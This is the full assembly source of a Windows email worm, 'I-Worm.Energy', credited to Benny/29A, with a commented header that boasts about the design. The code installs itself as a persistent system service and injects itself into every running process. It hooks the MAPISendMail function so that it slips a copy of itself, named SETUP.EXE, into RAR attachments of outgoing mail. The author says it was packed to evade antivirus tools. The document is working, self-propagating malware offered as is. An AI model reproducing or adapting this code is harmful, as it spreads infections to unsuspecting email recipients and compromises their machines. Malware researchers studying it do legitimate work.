
COMMENT #

                             ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
                       	     ³  I-Worm.Energy   ³
                       	     ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
	                    ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
        	            ³    by Benny/29A    ³
                	    ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

hey all...
ÄÄÄÄÄÄÄÄÄÄÄ

it was one b0ring sunday, when I decided to code some small and kewl virus...
I was tired from coding large projectz (HIV, XTC)... I wanted to code one
worm with some nice ideaz, like the Win2k.Stream.

and here it is. after some meditationz, full of experiencez from psychedelics
I decided to call this worm "Energy"... it is very small worm, spreading via
RAR filez. it can parse all processes, hook there MAPISendMail API procedure
and infect all attached RAR filez in a message by dropping itself to there.
very similar technique of the process'es address space manipulationz is
described in my article "Multi-process residency" and Win32.HIV virus. surely
it can't work on Win95/98 systemz. it worx on Windows 2000 OS, and (perhaps)
also on earlier versionz of Windows NT - but I don't know, I haven't tested it.

it can stay resident in memory as a service, by standard API callz, valid only
in NT systemz. while infecting the RAR archivez it addz itself to there under
the "SETUP.EXE" filename, containing also the standard setup icon. I tried to
optimize the source a bit... I know the worm is not super-small, but I it is
resident heavilly armoured very effective tiny mail-spreading worm.


the scheme of execution:
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

after execution:
- anti-* stuff
- if initialized by SCM, run as a service process
- copy worm to system directory as "ENERGY.EXE"
- register worm as service process and run it everytime the OS will start
- enum processes, find MAPI32.dll there and hook MAPSendMail (using many
  trics)
- wait one minute and again

hook_procedure:
- parse embedded filez and search for RAR filez.
- infect them by worm file: SETUP.EXE, mark as read-only (already-infected
  mark).


the worm is encrypted/compressed by "tElock, version 0.51", one very nice
utility for armouring executable filez. this protector containz many nice
anti-* featurez. that's why I decided to use it. and also becoz I think guyz at
AVP can't handle this one.

it is possible that worm containz some bugz. yeah, but I don't care... I'm glad
I was able to finish it in 2 dayz and that it was not b0ring. I had a fun.



If you would like to consult anything with me, feel free to contact me...



(c) 14th November 2000                            ÚÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
Czech Republic                                    ³ Benny / 29A ÀÄÄÄÄÄÄÄÄÄÄÄ¿
                                                  @ benny_29a@privacyx.com  ³
                                                  @ http://benny29a.cjb.net ³
                                                  ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
#


.586p
.model	flat						;blablabla

extrn	GetLastError:PROC				;needed APIz
extrn	EnumProcesses:PROC
extrn	OpenProcess:PROC
extrn	VirtualProtect:PROC
extrn	VirtualAllocEx:PROC
extrn	VirtualFreeEx:PROC
extrn	CloseHandle:PROC
extrn	CreateRemoteThread:PROC
extrn	WriteProcessMemory:PROC
extrn	Sleep:PROC
extrn	WaitForSingleObject:PROC
extrn	GetModuleHandleA:PROC
extrn	GetProcAddress:PROC
extrn	CreateFileA:PROC
extrn	WriteFile:PROC
extrn	GetModuleFileNameA:PROC
extrn	GetFileSize:PROC
extrn	ReadFile:PROC
extrn	VirtualFree:PROC
extrn	VirtualAlloc:PROC
extrn	SetFilePointer:PROC
extrn	SetFileAttributesA:PROC
extrn	OpenMutexA:PROC
extrn	ExitThread:PROC
extrn	GetSystemDirectoryA:PROC
extrn	CopyFileA:PROC


;extrn	OpenServiceA:PROC
;extrn	DeleteService:PROC				;***debug only!
extrn	OpenSCManagerA:PROC
extrn	CreateServiceA:PROC
extrn	CloseServiceHandle:PROC
extrn	StartServiceCtrlDispatcherA:PROC
extrn	RegisterServiceCtrlHandlerA:PROC
extrn	SetServiceStatus:PROC


include	useful.inc					;include filez
include	win32api.inc


PROC_COUNT		equ	40*4			;number of processes


.data
	db	?					;some data

.code
Start:							;worm code starts here
	pushad
        @SEH_SetupFrame <jmp    end_seh>                ;setup SEH frame

e_name:	@pushsz	'EnErGy'
	push	0
	push	1
	call	OpenMutexA				;check if mutex is
	test	eax,eax					;created, if not,
	je	end_seh					;we are prob. debugged
	push	eax
	call	CloseHandle				;close its handle

	jmp	SVCRegister				;logging as a service

e_svc:	push	256
	mov	esi, offset worm_name
	push	esi
	push	0
	call	GetModuleFileNameA			;get path+filename of
							;the worm
	mov	edi,offset sys_dir
	push	edi
	push	256
	push	edi
	call	GetSystemDirectoryA			;get windowz system dir.
	add	edi,eax
	mov	al,'\'
	stosb
	mov	eax,'rene'
	stosd
	mov	eax,'e.yg'
	stosd
	mov	eax,'ex'
	stosd						;construct path+filename

	pop	edi
	push	0
	push	edi
	push	esi
	call	CopyFileA				;copy worm to sys. dir.

	call	SVCCreate				;register as a service

	push	api_num
	pop	ecx
	call	@api_table
	dd	offset GetModuleHandleA			;adressez of APIz
	dd	offset GetProcAddress
	dd	offset VirtualProtect
	dd	offset CreateFileA
	dd	offset CloseHandle
	dd	offset WriteFile
	dd	offset GetFileSize
	dd	offset ReadFile
	dd	offset VirtualFree
	dd	offset VirtualAlloc
	dd	offset SetFilePointer
	dd	offset SetFileAttributesA
api_num = 12
@api_table:
	pop	ebx

	call	@api_dest				;addressez of variablez
	dd	offset _gmha				;that will hold APIz
	dd	offset _gpa
	dd	offset _vp
	dd	offset _cfa
	dd	offset _ch
	dd	offset _wf
	dd	offset _gfs
	dd	offset _rf
	dd	offset _vf
	dd	offset _va
	dd	offset _sfp
	dd	offset _sfaa
@api_dest:
	pop	esi

get_apiz:
	dec	ecx					;decrement counter
	mov	eax,[ebx+ecx*4]
	mov	eax,[eax+2]
	mov	eax,[eax]
	mov	edx,[esi+ecx*4]
	mov	[edx],eax				;store API address
	test	ecx,ecx
	jne	get_apiz

worm_loop:
	mov	ebx,offset tmp
	push	ebx
	push	PROC_COUNT
	mov	esi,offset proc_dump
	push	esi
	call	EnumProcesses				;enum all processez
	dec	eax
	jne	end_seh

	mov	ecx,[ebx]				;try this PID
p_check:lodsd
	call	proc_infect				;try to infect it
	add	ecx,-3
	loop	p_check					;try next PID

worm_wait:
	push	60000
	call	Sleep					;wait one minute
	jmp	worm_loop				;and try again.


;infect processez
proc_infect	Proc
	pushad
	push	eax
	push	0
	push	2 or 8 or 10h or 20h or 400h
	call	OpenProcess				;get handle to process
	xchg	eax,ecx
	jecxz	end_proc_infect
	mov	ebx,ecx

	push	PAGE_READWRITE
	push	MEM_RESERVE or MEM_COMMIT
	push	virtual_end-Start
	push	0
	push	ebx
	call	VirtualAllocEx				;allocate there memory
	xchg	eax,ecx					;for worm
	jecxz	end_proc_infect2
	mov	esi,ecx

	push	0
	push	virtual_end-Start
	push	offset Start
	push	esi
	push	ebx
	call	WriteProcessMemory			;copy there worm body
	dec	eax
	jne	end_proc_infect3

	lea	edx,[esi+offset ThreadEntry-offset Start]
	push	eax
	push	eax
	push	eax
	push	edx
	push	eax
	push	eax
	push	ebx
	call	CreateRemoteThread			;create thread there
	xchg	eax,ecx
	jecxz	end_proc_infect3
	push	ecx

	push	-1
	push	ecx
	call	WaitForSingleObject			;wait for its termination
	call	CloseHandle				;and close its handle
	jmp	end_proc_infect2			;and quit

end_proc_infect3:
	push	MEM_RELEASE
	push	0
	push	esi
	push	ebx
	call	VirtualFreeEx				;release memory if failed

end_proc_infect2:
	push	ebx
	call	CloseHandle				;close handle to process
end_proc_infect:
	popad
	ret						;and quit
proc_infect	EndP


;remote thread procedure
ThreadEntry	Proc
	pushad
	@SEH_SetupFrame	<jmp	end_seh>		;setup SEH frame
	call	gdelta
gdelta:	pop	ebp					;get delta offset

	@pushsz	'MAPI32.dll'
	mov	eax,12345678h
_gmha = dword ptr $-4
	call	eax					;get address of MAPI32.dll
	xchg	eax,ecx
	jecxz	end_seh					;quit if not loaded

	@pushsz	'MAPISendMail'
	push	ecx
	mov	eax,12345678h
_gpa = dword ptr $-4
	call	eax					;get address of
	xchg	eax,ecx					;MAPISendMail API
	jecxz	end_seh
	mov	esi,ecx					;to ESI

	lea	eax,[ebp + tmp - gdelta]
	push	eax
	push	PAGE_READWRITE
	push	5
	push	esi
	mov	eax,12345678h
_vp = dword ptr $-4
	call	eax					;release page protection
	xchg	eax,ecx
	jecxz	end_seh

	call	hook_api				;hook the API

end_seh:@SEH_RemoveFrame				;remove SEH frame
	popad						;and quit
	ret

;proc for API hooking
hook_api:
	mov	[ebp + old_MAPI_addr - gdelta],esi
	push	esi
	lea	edi,[ebp + old_MAPI_api - gdelta]
	movsd
	movsb						;save first bytez of API
	pop	edi
	mov	ebx,edi

	lea	eax,[ebp + MAPI_hooker - gdelta]
	sub	ebx,eax
	neg	ebx
	add	ebx,-5
	mov	al,0E9h
	stosb
	xchg	eax,ebx
	stosd						;overwrite by JMP <worm_api>
	ret

;the API hooker
MAPI_hooker:
	push	12345678h
old_MAPI_addr = dword ptr $-4				;save the address of API

	pushad
	mov	edi,[esp.cPushad]			;get ptr to message
	@SEH_SetupFrame	<jmp	end_seh>		;setup SEH frame
	push	edi

	mov	ebx,[esp.cPushad.28]
	mov	ecx,[ebx+40]				;number of attachmentz
	mov	ebx,[ebx+44]				;ptr to file fieldz

f_parse:mov	esi,[ebx+12]
	lea	edi,[ebp + arc_buffer - gdelta]
	push	edi
	@copysz
	dec	edi
	cmp	byte ptr [edi-1],'\'
	je	over_slash
	mov	al,'\'
	stosb
over_slash:
	mov	esi,[ebx+16]
	@copysz
	or	[esi-5],20202020h			;lower case
	cmp	[esi-5],'rar.'
	pop	esi					;create path+filename
	jne	o_r					;quit if not RAR file
	call	infect_archive				;try to infect this file
o_r:	sub	ebx,-24
	loop	f_parse					;try another file in msg

	pop	edi
	call	@m_res
	old_MAPI_api	db	5 dup (90h)
@m_res:	pop	esi
	movsd
	movsb						;remove the API hooker
	jmp	end_seh					;and quit


;procedure for RAR archive infecting
infect_archive:
	pushad
	@SEH_SetupFrame	<jmp	end_seh>		;setup SEH frame
	call	gd
gd:	pop	ebp					;get delta offset

	lea	eax,[ebp + worm_name - gd]		;get worm filename
	push	0
	push	FILE_ATTRIBUTE_NORMAL
	push	OPEN_EXISTING
	push	0
	push	0
	push	GENERIC_READ
	push	eax
	call	[ebp + _cfa - gd]			;open worm file
	inc	eax
	je	end_seh
	dec	eax
	mov	[ebp + hFile - gd],eax			;save handle

	push	0
	push	eax
	mov	eax,12345678h
_gfs = dword ptr $-4
	call	eax					;get its size
	push	eax

	push	PAGE_READWRITE
	push	MEM_RESERVE or MEM_COMMIT
	push	eax
	push	0
	mov	eax,12345678h
_va = dword ptr $-4
	call	eax					;allocate enough memory
	test	eax,eax
	pop	edx
	je	end_file
	xchg	eax,ebx

	push	edx
	push	0
	lea	eax,[ebp + tmp - gd]
	push	eax
	push	edx
	push	ebx
	push	dword ptr [ebp + hFile - gd]
	mov	eax,12345678h
_rf = dword ptr $-4					;and copy there worm
	call	eax
	call	close_file				;close handle to file
	pop	edi

	pushad
	mov	esi,ebx
	call	CRC32					;calculate CRC32 of
	mov	[ebp + RARCRC32 - gd],eax		;the worm file
	popad

	push	0
	push	FILE_ATTRIBUTE_NORMAL
	push	OPEN_EXISTING
	push	0
	push	0
	push	GENERIC_READ or GENERIC_WRITE
	push	esi
	mov	eax,12345678h
_cfa = dword ptr $-4
	call	eax					;open the archive
	inc	eax
	je	end_file2
	dec	eax
	mov	[ebp + hFile - gd],eax			;save its handle

	push	2
	push	0
	push	0
	push	eax
	mov	eax,12345678h
_sfp = dword ptr $-4
	call	eax					;go to EOF

	pushad
	lea	esi,[ebp + RARHeaderCRC+2 - gd]
	push	end_RAR-RARHeader-2 
	pop	edi
	call	CRC32					;calculate CRC32 of
	mov	[ebp + RARHeaderCRC - gd],ax		;the RAR file header
	popad						;and save it

	push	0
	lea	eax,[ebp + tmp - gd]
	push	eax
	push	end_RAR-RARHeader
	call	end_RAR
RARHeader:                                      	;No comment ;)
RARHeaderCRC	dw	0
RARType		db	74h
RARFlags	dw	8000h
RARHSize        dw      end_RAR-RARHeader
RARCompressed	dd	2000h
RAROriginal	dd	2000h
RAROS		db	0
RARCRC32	dd	0
RARFileDateTime dd      12345678h
RARNeedVer	db	14h
RARMethod	db	30h
RARFNameSize    dw      end_RAR-RARName
RARAttrib	dd	0
RARName		db	'SETUP.EXE'
end_RAR:
	push	dword ptr [ebp + hFile - gd]
	mov	eax,12345678h
_wf = dword ptr $-4
	call	eax					;write RAR file header

	push	0
	lea	eax,[ebp + tmp - gd]
	push	eax
	push	edi
	push	ebx
	push	dword ptr [ebp + hFile - gd]
	call	[ebp + _wf - gd]			;write the worm

end_file2:
	push	MEM_RELEASE
	push	0
	push	ebx
	mov	eax,12345678h
_vf = dword ptr $-4
	call	eax					;release the memory
end_file:
	call	close_file				;close the archive

	push	FILE_ATTRIBUTE_READONLY
	push	esi
	mov	eax,12345678h
_sfaa = dword ptr $-4
	call	eax					;set READ-ONLY attribute
	jmp	end_seh					;and quit

close_file:
	push	12345678h				;handle...
hFile = dword ptr $-4
	mov	eax,12345678h
_ch = dword ptr $-4
	call	eax					;close file handle
	ret

CRC32	Proc
	push	ecx					;procedure for 
	push	edx					;calculating CRC32s
	push	ebx       				;at run-time
        xor	ecx,ecx   
        dec	ecx        
        mov	edx,ecx   
NextByteCRC:           
        xor	eax,eax   
        xor	ebx,ebx   
        lodsb          
        xor	al,cl     
	mov	cl,ch
	mov	ch,dl
	mov	dl,dh
	mov	dh,8
NextBitCRC:
	shr	bx,1
	rcr	ax,1
	jnc	NoCRC
	xor	ax,08320h
	xor	bx,0EDB8h
NoCRC:  dec	dh
	jnz	NextBitCRC
	xor	ecx,eax
	xor	edx,ebx
        dec	edi
	jne	NextByteCRC
	not	edx
	not	ecx
	pop	ebx
	mov	eax,edx
	rol	eax,16
	mov	ax,cx
	pop	edx
	pop	ecx
SVCHandler:
	ret
CRC32	EndP
ThreadEntry	EndP


;log on to SCM
SVCRegister	Proc
	call	_dt
	dd	offset e_name+5
	dd	offset service_start
	dd	0
	dd	0
_dt:	call	StartServiceCtrlDispatcherA		;start service dispatcher
	dec	eax
	jne	e_svc					;quit if error (no service
							;requestz)
	push	0
	call	ExitThread				;terminate this thread

service_start:						;execution goes here...
	pushad
	@SEH_SetupFrame	<jmp end_seh>			;setup SEH frame

	push	offset SVCHandler
	push	offset e_name+5
	call	RegisterServiceCtrlHandlerA		;register service control
	test	eax,eax					;handler
	je	e_svc					;quit if error
	push	eax

	call	_ss
ss_:	dd	10h or 20h
	dd	4
	dd	0
	dd	0
	dd	0
	dd	0
	dd	0
_ss:	push	eax
	call	SetServiceStatus			;set service status
	call	CloseServiceHandle			;close service handle
	jmp	e_svc					;and quit
SVCRegister	EndP


;create item at SCM
SVCCreate	Proc
	push	000F0000h or 2
	push	0
	push	0
	call	OpenSCManagerA				;get handle to SCM
	test	eax,eax
	je	e_scm0
	xchg	eax,esi

;	push	000F0000h or 1 or 2 or 4 or 8 or 10h or 20h or 40h or 80h or 100h
;	push	offset e_name+5
;	push	esi
;	call	OpenServiceA				;*** debug!
;
;	push	eax
;	push	eax
;	call	DeleteService				;*** debug!
;	call	CloseServiceHandle			;*** debug!

	xor	eax,eax
	push	eax
	push	eax
	push	eax
	push	eax
	push	eax
	push	offset sys_dir
	push	eax
	push	2
	push	10h
	push	000F0000h or 1 or 2 or 4 or 8 or 10h or 20h or 40h or 80h or 100h
	push	offset e_name+5
	push	dword ptr [esp]
	push	esi
	call	CreateServiceA				;create service item
	test	eax,eax					;at SCM
	je	e_scm1					;quit if error

	push	eax
	call	CloseServiceHandle			;close service handlez
e_scm1:	push	esi
	call	CloseServiceHandle			;...
e_scm0:	ret						;and quit
SVCCreate	EndP


signature		db	0,'[I-Worm.Energy] by Benny/29A',0
							;signature
	proc_dump	db	PROC_COUNT dup (?)	;buffer for PIDz
	worm_name	db	256 dup (?)		;buffer for filename
	tmp		dd	?			;temporary variable
	sys_dir		db	256 dup (?)		;buffer for system dir.
	arc_buffer	db	256 dup (?)		;buffer for archive
							;filename
virtual_end:						;...end of virus.
ends
end    Start						;.


;bonus:
;here are lyrics from "Imagine", one very nice song from John Lennon.

;		Imagine there's no heaven, 
;		It's easy if you try, 
;		No hell below us, 
;		Above us only sky, 
;		Imagine all the people 
;		living for today... 
;
;		Imagine there's no countries, 
;		It isn't hard to do, 
;		Nothing to kill or die for, 
;		No religion too, 
;		Imagine all the people 
;		living life in peace... 
;
;		You may say I'm a dreamer, 
;		but I'm not the only one, 
;		I hope some day you'll join us, 
;		And the world will live as one.
;
;		Imagine no possesions, 
;		I wonder if you can, 
;		No need for greed or hunger, 
;		A brotherhood of man, 
;		Imagine all the people 
;		Sharing all the world... 
;
;		You may say I'm a dreamer, 
;		but I'm not the only one, 
;		I hope some day you'll join us, 
;		And the world will live as one.
